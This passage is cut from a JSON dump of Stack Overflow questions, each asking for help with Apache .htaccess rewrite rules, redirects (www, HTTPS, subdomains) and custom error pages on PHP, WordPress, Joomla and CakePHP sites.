url","body":"<p>For development purpose, I have duplicated the live instance files in a separate sub domain with different database. I modified the path the sub domain and .htaccess file including the database table setting changes. Everything works perfectly for the sub domain blog, However when I tried to access </p>\n\n<p><a href=\"http://dev.mysite.com/wp-admin\" rel=\"nofollow\">http://dev.mysite.com/wp-admin</a></p>\n\n<p>it is redirecting to </p>\n\n<p><a href=\"http://www.mysite.com/login?redirect_to=http%3A%2F%2Fdev.mysite.com%2Fwp-admin%2F&amp;reauth=1\" rel=\"nofollow\">http://www.mysite.com/login?redirect_to=http%3A%2F%2Fdev.mysite.com%2Fwp-admin%2F&amp;reauth=1</a></p>\n\n<p>So the admin panel moving to root site admin.</p>\n\n<p>I unable to find out which settings I missed out.</p>\n\n<p>Any help/clue is much appreciated.</p>\n"},{"tags":["php","javascript","html",".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":12009633,"title":"Pointing url to a page","body":"<p>I have seen in wordpress, when you create a page say \"Register\", it points to <a href=\"http://domain.com/register/\" rel=\"nofollow\">http://domain.com/register/</a> but without having a folder named register in the root at all. How is this done?</p>\n\n<p>Its like this. When a user clicks the link on <a href=\"http://domain.com/index.php\" rel=\"nofollow\">http://domain.com/index.php</a> which says Register, it takes the user to a new page and the url in the browser would be <a href=\"http://domain.com/register/\" rel=\"nofollow\">http://domain.com/register/</a> and the page loads. The <code>register</code> folder itself does not exist. </p>\n\n<p>From the answers below I learnt that the request is passed through the index.php by modifying the <code>.htaccess</code></p>\n\n<p>I want to know what code to place in <code>index.php</code> so that <a href=\"http://domain.com/register/\" rel=\"nofollow\">http://domain.com/register/</a> would display the register page.</p>\n\n<p>For example you can go to <a href=\"http://teraflakes.com/register/\" rel=\"nofollow\">http://teraflakes.com/register/</a> the directory <code>register</code> doesnot exist but still the content is loaded by the index.php I want to know how that is done in php.</p>\n"},{"tags":["linux","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12486133,"title":"htaccess redirect to different page on 403 Forbidden Error","body":"<p>Can't find this for the life of me. We have the indexes protected so if someone goes to <code>CDNdomain.com/1/</code> they won't see anything unless they do <code>CDNdomain.com/1/something.jpg</code>. When they visit <code>/1/</code> they are presented with a 403 Forbidden error. What I would like to do is when they are shown a 403 Forbidden error to instead redirect them to <code>ourRealdomain.com</code>.</p>\n\n<p>Any ideas?</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":12485120,"title":"Redirecting %{QUERY_STRING} to friendly url","body":"<p>I'm trying to add one last improvement (regarding htaccess), and that is that I would like it to redirect <code>/?mod=inicio</code> to <code>/inicio</code>. So I'm trying to do it with the following code, but It keeps building the url like this <code>/inicio?mod=inicio</code></p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^mod=([a-z]+)$ [NC]\nRewriteRule .* /%1 [L]\n</code></pre>\n\n<p>Same thing with extra parameters: from <code>/?mod=x&amp;type=y-z</code> to <code>/x/y-z</code></p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":12483746,"title":"Possible improvements for RewriteRules","body":"<p>So, I just managed to write some <code>RewriteCond</code> and <code>RewriteRule</code> for a custom site that I developed a while ago and as I'm a beginner in all of this, I was hopping that somebody will review my code and tell me if there's anything to improve or if it is good as it is.</p>\n\n<p>What I'm trying to achieve is to convert from <code>/?mod=x</code> to <code>/x</code> and from <code>/?mod=x&amp;type=y-z</code> to <code>/x/y-z</code></p>\n\n<p>And here's what I've done by now:</p>\n\n<pre><code># Removes trailing slashes (prevents SEO duplicate content issues)\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)/$ $1 [L,R=301]\n\nRewriteCond %{REQUEST_URI} /([a-z]+)/([a-z\\-]+)$ [NC]\nRewriteRule ^([^/]*)/([^/]*)$ /?mod=$1&amp;tipo=$2 [NC,L]\n\nRewriteCond %{REQUEST_URI} /([a-z]+)/?$ [NC]\nRewriteRule ^([^/]*)$ /?mod=$1 [NC,L]\n</code></pre>\n\n<p>So, everything ok? Or, is there room for improvement?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":12483801,"title":"Matching subdomain to one place then if there is a trailing slash match to another","body":"<p>My subdomains are dynamic, and need to be handled by one rule if they're top level, if they contain a second handler if they're not.</p>\n\n<p>Here's what I have :</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{HTTP_HOST} !^(www\\.)?(www|ftp|mail|webmail)\\.domain\\.com$ [NC]\nRewriteCond %{HTTP_HOST} ^(www.)?([a-z0-9-]+)\\.domain\\.com$ [NC]\n#This is successful\nRewriteRule (.*) displaylist.php?shorturl=%2 [NC,QSA]\n#NOT WORKING\nRewriteRule /id/([0-9+])$ viewpage.php?id=$1 [NC,QSA]\n</code></pre>\n\n<p>So subdomain.domain.com works correctly BUT subdomain.domain.com/id/1230/ doesn't.</p>\n\n<p>The rule to catch the next line doesn't work and just shows the displaylist.php with all of the relative linking broken.</p>\n\n<p>EDIT:</p>\n\n<p>New rules, rewrite is working but none of the relative files are intact</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{HTTP_HOST} !^(www\\.)?(www|ftp|mail|webmail)\\.domain\\.com$ [NC]\nRewriteCond %{HTTP_HOST} ^(www.)?([a-z0-9-]+)\\.domain\\.com$ [NC]\n#This is successful\nRewriteRule (.*) displaylist.php?shorturl=%2 [NC,QSA]\n#Working, but relative files (like css) aren't loading correctly\nRewriteCond %{THE_REQUEST} id/([0-9]+)/?\nRewriteRule ^(.*) viewpage.php?id=%1 [NC,L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12484607,"title":"SEO Url for Profiles","body":"<h1>Preface</h1>\n\n<p>I'm trying to re-write a URL for a profile page.  All of my application pages have a <code>.html</code> extension, so I'm trying to match just letters, numbers, <code>-</code>, and <code>.</code>.</p>\n\n<p>So these would be valid</p>\n\n<pre><code>site.com/steve\nsite.com/steve-robbins\nsite.com/steve.robbins\n</code></pre>\n\n<p>But these wouldn't be</p>\n\n<pre><code>site.com/steve.html\nsite.com/steve-robbins.php\n</code></pre>\n\n<p>Assume I have a check in place so that custom URLs don't have <code>.html</code> or <code>.php</code> on the end.</p>\n\n<h1>Problem</h1>\n\n<p>I'm currently using this but it's not working</p>\n\n<pre><code>RewriteRule ^([a-zA-Z0-9\\.-]+)$ profile.php?url=$1 [L]\n</code></pre>\n\n<p>It should set <code>url</code> to <code>steve</code>, but it's setting it to <code>profile.php</code></p>\n\n<p>What am I doing wrong?</p>\n\n<hr>\n\n<p>My complete <code>.htaccess</code></p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^[^.]+\\.[^.]+$\nRewriteRule ^(.*) http://www.%{HTTP_HOST}/$1 [R=301]\n\n#\n#   LOGIN\n#\nRewriteRule ^([a-z0-9]{255})/activate\\.html$ login.php?activate=$1 [L]\nRewriteRule ^logout\\.html$ login.php?logout [L]\n\n#\n#   SETTINGS\n#\nRewriteRule ^change-([a-z]+)\\.html$ account-settings.php?$1 [L]\n\nRewriteRule ^([a-zA-Z0-9\\.-]+)$ profile.php?url=$1 [L]\n\n# SEO friendly URLs\nRewriteRule ^([a-zA-Z0-9-_.]+)\\.html$ $1.php [L]\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /([a-zA-Z0-9-_.]+)\\.php\nRewriteRule ^([a-zA-Z0-9-_.]+)\\.php$ $1.html [R=301]\n</code></pre>\n"},{"tags":[".htaccess","magento","joomla"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12482994,"title":"Combine a .htaccess for Joomla and Magento","body":"<p>First of all, my English is not optimal, but I will give it a try. I hope you will understand what the problem is.\nIn the root of my website I built a site with Joomla. In the subfolder \\webshop\\ I build a site with Magento.</p>\n\n<p>I can’t get my .htaccess file right for this. For now the Joomla site works well, and the Magento site also. But I can’t click on for example \\Contact us\\ in Magento. The link (h t t p ://website.com/webshop/contacts) leads me back to the homepage. But when I edit the link to (h-t-t-p-://website.com/webshop/index.php/contacts) it works perfectly. So there is something wrong.</p>\n\n<p>For clarity, when people go to h-t-t-p-://example.nl, they should go to my Joomla site, but when people go to h-t-t-p-://example.nl/webshop, they should go to my webshop. (/webshop is also the location of the Magento folder in my root, of course)</p>\n\n<p>I also want to use <a href=\"http://website.com\" rel=\"nofollow\">http://website.com</a> and not h-t-t-p-://www.website.com. (Also very important for SSL in Magento, because I have only a SSL certificate for h-t-t-p-:// and not for h-t-t-p-://www.)</p>\n\n<p>I found out that when I use \"Rewrite base /webshop\" in the .htaccess, it works perfect, but then the Joomla site doesn't work. I combined the Magento .htaccess with my own. I had to upload it with pastebin, because this site doesn't allow links and WWW. Can you please tell me what I've done wrong there?</p>\n\n<p><a href=\"http://pastebin.com/mv5whinq\" rel=\"nofollow\">Pastebin</a></p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["php",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12483659,"title":"Htaccess broke $_SERVER['PATH_INFO']","body":"<p>I have a .htacess file like ;</p>\n\n<pre><code>RewriteRule ^(.*)$ index.php/$1 [NC,QSA,L]\n</code></pre>\n\n<p>Let say I have a url : <code>www.example.com/index/action</code>. \nWhen I print <code>$_SERVER['PATH_INFO']</code> in index.php I see <code>/action</code></p>\n\n<p>But if my url is like <code>www.example.com/index1/action</code> I can see <code>/index1/action</code></p>\n\n<p>but i want to see the full path in both case. How can i fix it?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12399305,"title":"htaccess add www and rewrite","body":"<p>I'm trying to get an htaccess file to do a rewrite before doing a redirect. I'm using the following to redirect:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^domainname\\.com$ [OR]\nRewriteCond %{HTTP_HOST} ^www\\.domainname\\.com$\nRewriteRule ^/?$ \"http\\:\\/\\/domainname\\.com\\.au\\/\" [R=301,L]\n</code></pre>\n\n<p>Ideally what I want to happen is for the url to have the www added to it BEFORE it gets redirected.Thanks in advance for any help.  </p>\n"},{"tags":["html","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12481974,"title":"Use 2 different 404 pages dependent on directory","body":"<p>I'm trying to use 2 separate 404 pages depending on what directory the user is currently in. I thought you could do this with an .htaccess file in the directory however it's not working. Is this even possible?</p>\n\n<p>Example: user is looking at a document in  www.domain.com. This directory should use number1_404.html. </p>\n\n<p>Example2: user is looking at a document in www.domain.com/other_directory. This directory should use number2_404.html.</p>\n\n<p>I am not sure totally how to write a rule for this but this is what I have now and it's not working. </p>\n\n<pre><code>.htaccess &lt;--- in the root folder /httpdocs\nErrorDocument 404 /root_404.php\n\n.htaccess &lt;---- in the subdirectory /httpdocs/subdirectory\nErrorDocument 404 /subdirectory/subdirectory_404.php\n</code></pre>\n\n<p>perhaps I'm not understanding how this all works so please excuse my ignorance.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12479296,"title":".htaccess Folder redirect","body":"<p>I try to make redirect in my folder:</p>\n\n<pre><code>Redirect /promotion/ /newpromotion\nRedirect /promotion/first/ /new/first/\n</code></pre>\n\n<p>And now if I try to open <code>http://mysite.com/promotion/first</code> I open <code>http://mysite.com/newpromotion/new/first</code> but I need <code>http://mysite.com/new/first</code></p>\n\n<p>How can I fix it?</p>\n\n<p><strong>UPD:</strong>\nIt's crazy but I did it:</p>\n\n<pre><code>   Redirect /promotion/ /newpromotion\n   Redirect /promotion/first/ /new/first/\n   Redirect /newpromotion/new/first /new/first/\n</code></pre>\n\n<p><strong>Solution:</strong>\nNeed to reverse the 2 directives:</p>\n\n<pre><code>Redirect /promotion/first /new/first\nRedirect /promotion /newpromotion\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12481047,"title":"Auto-append dummy folder name to end of base URL","body":"<p>Take a look at this sample vhost snippet:</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    DocumentRoot /web/content\n    ServerName   me.example.com\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>Say <em>/web/content</em> contains 2 files, <em>index.html</em> and <em>page.html</em>, and a subdirectory <em>colors</em> containing <em>yellow.html</em>. <em>index.html</em> contains links like <code>href=\"/page.html\"</code> and <code>href=\"/colors/yellow.html\"</code>, using <code>/</code> to refer to the web root.</p>\n\n<p>Is there a way to internally use <strong>me.example.com/test/</strong> as the <strong>root</strong> of the site? In other words, when a user goes to <a href=\"http://me.example.com/test/\" rel=\"nofollow\">http://me.example.com/test/</a>, I want to fetch <em>/web/content/index.html</em>. So, the <em>/test/</em> in the URL would essentially be a dummy \"folder\". </p>\n\n<p>Basically, I'd like me.example.com/test to function exactly how a subdomain (say, <em>test.me.example.com</em>) would. Something like setting <code>ServerName me.example.com/test</code> (but I know that doesn't work).  </p>\n\n<p>I know I could simply make a REAL folder <em>/web/content/test</em> and put everything in there, but that would break my links beginning with a <code>/</code>, as they would still refer to <em>/web/content</em> as the web root. The same problem arises when adding a directive like <code>Alias /test /web/content</code>.</p>\n\n<p>Do I have any options here? Maybe using RewriteBase somehow? (I've tried a few things with no luck.)<br>\nDon't even ask why I'm trying to do this; I know it's insane, stupid, and not good web design. >_></p>\n"},{"tags":["php","apache","svn",".htaccess","lamp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12481946,"title":"How can .htaccess use different directive under different OS","body":"<p>I have develop machine, which is windows and I will deploy my website to an ubuntu server. so, how can one .htaccess file use different directive under different environment. </p>\n\n<p>for example:</p>\n\n<p>php_value auto_prepend_file D:\\123\\bigsite\\include\\global.php</p>\n\n<p>in ubuntu, i should replace the value with another location.</p>\n\n<p>I use svn and a post hook to automaticlly check out files to ubuntu server, so when i check in to svn, the .htaccess content is the same in the windows </p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12474442,"title":"Redirect Sub-Domain and Directory with same name","body":"<p>I'm need to do the following redirects\nFrom: <code>http://xyz.domain.com/2012/01/sample.html</code>\nTo <code>http://www.domain.com/2012/01/sample.html</code></p>\n\n<p>and also</p>\n\n<p>From: <code>http://www.domain.com/xyz/2012/01/sample.html</code>\nTo: <code>http://www.domain.com/2012/01/sample.html</code></p>\n\n<p>I'm pretty clueless on this, can somebody help me how to accomplish the same.</p>\n\n<p>Thank.</p>\n"},{"tags":["apache",".htaccess","ssl","joomla"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12388272,"title":"Site keeps redirecting to HTTP when I visit HTTPS, for no apparent reason","body":"<p>I am trying to get SSL working for my site on a LAMP server.  When I type any page address on the site as <a href=\"https://www.example.com\" rel=\"nofollow\">https://www.example.com</a> it gets redirected to <a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a>.</p>\n\n<p>I think the SSL would work (or at least I could get it to) if I could get the server to go through HTTPS but it just refuses, and always changes to HTTP.  The site utilises Joomla! but I am pretty sure it's not relevant, as:</p>\n\n<ul>\n<li><p>I have another almost identical Joomla! site on the same server, and SSL works successfully.</p></li>\n<li><p>SSL certificate has been checked and is valid and installed correctly.</p></li>\n<li><p>There are no PHP redirects.</p></li>\n<li><p>There are no .htaccess redirects directly pertaining to HTTP/S, etc.</p></li>\n</ul>\n\n<p><strong>.htaccess</strong></p>\n\n<pre><code>Options +FollowSymLinks\n\nRewriteEngine On\n\nRewriteCond %{QUERY_STRING} base64_encode[^(]*\\([^)]*\\) [OR]\nRewriteCond %{QUERY_STRING} (&lt;|%3C)([^s]*s)+cript.*(&gt;|%3E) [NC,OR]\nRewriteCond %{QUERY_STRING} GLOBALS(=|\\[|\\%[0-9A-Z]{0,2}) [OR]\nRewriteCond %{QUERY_STRING} _REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\nRewriteRule .* index.php [F]\n\nRewriteRule ^order/payment(/?.*)$ /payment [R=301,L]\nRewriteRule ^order/complete$ /index.php?option=com_cake&amp;task=orders&amp;id=complete [L]\nRewriteRule ^order2$ /index.php?option=com_cake&amp;task=orders&amp;id=index [L]\nRewriteRule ^order/2$ /index.php?option=com_cake&amp;task=orders&amp;id=index [L]\nRewriteRule ^payment/(.+)$ /index.php?option=com_cake&amp;task=payments&amp;id=$1 [L]\nRewriteRule ^admin/(.+)$ /index.php?option=com_cake&amp;task=admin&amp;id=$1 [L]\n\nRewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\n\nRewriteCond %{REQUEST_URI} !^/index\\.php\nRewriteCond %{REQUEST_URI} /component/|(/[^.]*|\\.(php|html?|feed|pdf|vcf|raw))$ [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule .* index.php [L]\n</code></pre>\n\n<p>So why is the site redirecting?  Any ideas?</p>\n\n<p>For anyone who knows Joomla! I tried installing this plugin <a href=\"http://www.yireo.com/software/joomla-extensions/ssl-redirect\" rel=\"nofollow\">http://www.yireo.com/software/joomla-extensions/ssl-redirect</a> and tried enabling the 'Secure' option on my home page and it doesn't work.  I assume this is because it probably is working but the server is redirecting to HTTP again, for some unknown reason.</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":1,"view_count":76,"score":4,"question_id":12356996,"title":"Unable to get 10th variable in url string through .htaccess","body":"<p>I want to get get sort_by in my php code but its seems to be that this is returning value of variable 1 with digit 0.</p>\n\n<pre><code>RewriteRule ^abc/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/([^/]+)/?$ search.php?counrty=abc&amp;state=$1&amp;gender=$2&amp;r_city=$3&amp;r_mstatus=$4&amp;r_religion=$5&amp;r_ethnicity=$6&amp;r_cast=$7&amp;r_profession=$8&amp;r_education=$9&amp;sort_by=$10 [NC]\n</code></pre>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12471040,"title":"Redirect of www to non-www works works for all URLs except the root","body":"<p>I have the following code in my Apache htaccess file that is used to redirect all www URLs to non-www URLs on wordpress. This works for all URLs except the root.</p>\n\n<p>For example, <a href=\"http://www.noshon.it/recipes\" rel=\"nofollow\">http://www.noshon.it/recipes</a> redirects properly to <a href=\"http://noshon.it/recipes\" rel=\"nofollow\">http://noshon.it/recipes</a>. However, <a href=\"http://www.noshon.it\" rel=\"nofollow\">http://www.noshon.it</a> incorrectly redirects to <a href=\"http://noshon.it/wordpress\" rel=\"nofollow\">http://noshon.it/wordpress</a> (where it receives a 404 page).</p>\n\n<p>I can't figure out why all ULRs work except for the root. Any help would be much appreciated.</p>\n\n<pre><code>RewriteEngine On   \nRewriteCond %{HTTP_HOST} ^www\\.noshon\\.it$ [NC]  \nRewriteRule ^(.*)$ http://noshon.it/$1 [R=301,L]  \nRewriteBase /  \nRewriteRule ^index\\.php$ - [L]  \nRewriteCond %{REQUEST_FILENAME} !-f  \nRewriteCond %{REQUEST_FILENAME} !-d  \nRewriteRule . /index.php [L]  \n</code></pre>\n"},{"tags":[".htaccess","cakephp","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12478508,"title":"CakePHP redirect .php to controller","body":"<p>My old website URL structure was something like this:</p>\n\n<pre><code>http://www.example.com/index.php?go=archives&amp;data=lastweek\n</code></pre>\n\n<p>Today, I migrated to CakePHP, so that URL won't work. So I want to redirect it to this URL:</p>\n\n<pre><code>http://www.example.com/archives/find?data=lastweek\n</code></pre>\n\n<p>(I don't want to change query string to action parameter, for some reason, I should keep it as a query string.)</p>\n\n<p>What should I do? (edit which <code>.htaccess</code> file? CakePHP has 3 files!)</p>\n"},{"tags":[".htaccess","seo","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12474909,"title":"HTAccess Rewrite Based on Webpage Name?","body":"<p>I have a list of items on a web-page of the form :</p>\n\n<ul>\n<li><code>www.mydomain.com/item1-EUR.html</code></li>\n<li><code>www.mydomain.com/item1-GBP.html</code></li>\n<li><code>www.mydomain.com/item2-EUR.html</code></li>\n<li><code>www.mydomain.com/item2-GBP.html</code></li>\n</ul>\n\n<p>Is it possible to access the subsequent web-page file in :</p>\n\n<p><code>/myitems/eur/item1-EUR.html</code>, or <code>/myitems/gbp/item1-GBP.html</code></p>\n\n<p>I'm trying to show that the items web-pages are located in the root directory, but without cluttering up the root area.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12474175,"title":"Redirect htacces links","body":"<p>I want to redirect some links for not having duplicate content on google</p>\n\n<p>The links are like this.. www.example.ro/adidasi_dama.php?page=1</p>\n\n<p>I made the rewrite rule to .. www.example.ro/adidasi-dama/pagina-1/</p>\n\n<p>with this code..</p>\n\n<pre><code>RewriteRule ^([a-zA-Z]+)([-_]){1}([a-zA-Z]+)/pagina-([0-9]+)/$ $1_$3.php?page=$4\nRewriteRule ^([a-zA-Z]+)([-_]){1}([a-zA-Z]+)/$ $1_$3.php\nRewriteRule ^([a-zA-Z_]+)/pagina-([0-9]+)/$ /$1.php?page=$2\n</code></pre>\n\n<p>But now... both versions are working... .. i want to automaticaly redirect from 1st link to second... but i need it for all my pages.. </p>\n\n<p>i have many links for example</p>\n\n<ul>\n<li>www.example.ro/noutati.php?page=1</li>\n<li>www.example.ro/adidasi_fete.php?page=1</li>\n<li><p>www.example.ro/pantofi_barbati.php?page=1</p>\n\n<p>...</p></li>\n</ul>\n\n<p>Thank you very much!</p>\n"},{"tags":[".htaccess","google","seo","search-engine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1162,"score":0,"question_id":10735766,"title":"Block all bots/crawlers/spiders for a special directory with htaccess","body":"<p>I'm trying to block all bots/crawlers/spiders for a special directory. How can I do that with <code>htaccess</code>? I searched a little bit and found a solution by blocking based on the user agent:</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} googlebot\n</code></pre>\n\n<p>Now I would need more user agents (for all bots known) and the rule should be only valid for my separate directory. I have already a robots.txt but not all crawlers take a look at it ... Blocking by IP address is not an option. Or are there other solutions? I know the password protection but I have to ask first if this would be an option. Nevertheless, I look for a solution based on the user agent.</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12447282,"title":"redirect domain to www on codeigniter","body":"<p>What would be the best way to redirect codeigniter website to www domain? The only way that comes to my mind is to use htaccess for this but can't figure out exactly how. This is the rewrite rule I'm using right now to remove index.php from the url. How should I add the redirection to www domain correctly?</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|assets|uploads|robots\\.txt|favicon\\.png|favicon\\.ico)\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","https"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":176,"score":0,"question_id":12400792,"title":"RewriteRule violates  while switching from https to http","body":"<p>I write a lot of <strong>RewriteRule</strong> in my <code>.htaccess</code> file , but problem occurs when I switch from <strong>https</strong> to <strong>http</strong> pages; it does not follow these rules </p>\n\n<p><strong>NOTE :</strong> everything working fine on localhost ,  issues are on server &lt;---- <strong>UPDATE</strong></p>\n\n<p>Here is my <a href=\"http://www.charityrummage.com\" rel=\"nofollow\">website </a>, currently all links display as per <strong>RewriteRule*</strong>   </p>\n\n<p>for  e.g. <strong>about us</strong> page link display as</p>\n\n<pre><code>http://www.charityrummage.com/about\n</code></pre>\n\n<p><strong>BUT</strong> </p>\n\n<p>if I am at <a href=\"https://www.charityrummage.com/login\" rel=\"nofollow\"><code>login page</code></a> ( which is on <code>https</code> ) and click on <strong>about us</strong> page then it turns into below.</p>\n\n<pre><code>http://www.charityrummage.com/about?slug=about_us\n</code></pre>\n\n<p>or if I click on any category on left panel then it comes as</p>\n\n<pre><code>http://www.charityrummage.com/auction/category/1?cid=1\n</code></pre>\n\n<p><strong>Note :</strong>  even mouse hovering on pages display rewrite link</p>\n\n<p>below is <code>.htaccess</code> file with needed information.</p>\n\n<pre><code>IndexIgnore *\n\nRewriteEngine on\nOptions +FollowSymLinks \nRewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^auction/category/([0-9]+)/?$ bids.php?cid=$1 [NC]\n\nRewriteRule ^login/?$ login.php [NC]\nRewriteRule ^register/?$ register.php [NC]\nRewriteRule ^logout/?$ logout.php [NC]\n\n# static pages\nRewriteRule ^about/?$ page.php?slug=about_us [NC]\n\n# Rewrite to https\nRewriteCond %{SERVER_PORT} !^443$ [OR]\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /login [OR]\nRewriteCond %{REQUEST_URI} /do_login.php     \nRewriteRule ^(.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,NC,L,QSA]\n\n# don't do anything for images/css/js (leave protocol as is)\nRewriteRule \\.(gif|jpe?g|png|ico|css|js)$ - [NC,L]\n\n# traffic to http:// except some pages\nRewriteCond %{SERVER_PORT} ^443$ [OR]\nRewriteCond %{HTTPS} on\nRewriteCond %{REQUEST_URI} !(/login|/do_login.php)\nRewriteRule ^(.*) http://%{HTTP_HOST}%{REQUEST_URI} [R=301,NC,L,QSA]\n</code></pre>\n\n<p><em>Note :</em> <a href=\"http://pastebin.com/YPiehZq1\" rel=\"nofollow\"><code>Here</code></a> is complete <code>.htaccess</code> file </p>\n\n<p>Please tell me where I am wrong/missing ?</p>\n\n<p>I Also have few more confusion</p>\n\n<ul>\n<li>If i change the case of rewrite URL ( <strong>Login or lOgin or logiN</strong> )  then it gives error?</li>\n<li>Is it good practice to write <strong>[NC,L]</strong> with all <code>RewriteRule</code>?</li>\n<li>Exactly when I should write  <strong>[QSA]</strong> ?</li>\n</ul>\n\n<hr>\n\n<h1>UPDATE</h1>\n\n<p>After suggestions from all answers, <strong>changing in <code>RewriteRule</code> almost fixed all issue</strong> but now there is one last issue.</p>\n\n<ul>\n<li><code>/login</code> URL always changed into <code>/login.php</code>.</li>\n</ul>\n\n<p>below is my updated <strong>.htaccess</strong></p>\n\n<pre><code>IndexIgnore *\nOptions -MultiViews\nOptions +FollowSymLinks\n\n#mod_rewrite\nRewriteEngine on\nRewriteBase /\n\n# Rewrite www to non www\nRewriteCond %{HTTP_HOST} ^www.%{HTTP_HOST} [NC]\nRewriteRule ^(.*)$ http://%{HTTP_HOST}/$1 [R=301,L]\n\n# minimize the css on all http:// pages\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteCond %{HTTPS} off\n   RewriteRule ^(.*).css$ /csszip.php?file=$1.css [L]\n&lt;/IfModule&gt;\n\n#switch over http to https\n\n# Rewrite to https\nRewriteCond %{SERVER_PORT} !^443$ [OR]\nRewriteCond %{HTTPS} off\n\nRewriteCond %{REQUEST_URI} (/login|/do_login)\\.php [NC]\nRewriteRule ^(.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\n# don't do anything for images/css/js (leave protocol as is)\nRewriteRule \\.(gif|jpe?g|png|ico|css|js)$ - [NC,L]\n\n# traffic to http:// except some pages\nRewriteCond %{SERVER_PORT} ^443$ [OR]\nRewriteCond %{HTTPS} on\n\nRewriteCond %{REQUEST_URI} !(/login|/do_login)\\.php [NC]\n\nRewriteRule ^(.*) http://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^login/?$ login.php [NC]\nRewriteRule ^register/?$ register.php [NC]\n# ...many other rules...with [NC] falg\n\nRewriteRule ^auction/category/([^/.]+)/?$ bids.php?cid=$1 [NC]\nRewriteRule ^about/?$ page.php?slug=about_us [NC]\n# ...many more rules.... with [NC] flag\n</code></pre>\n"},{"tags":["wordpress",".htaccess","subdomain"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12476892,"title":".htaccess changes for opening sub domain's dashboard","body":"<p>I have already ask a question about the wordpress sub domain. This is the <a 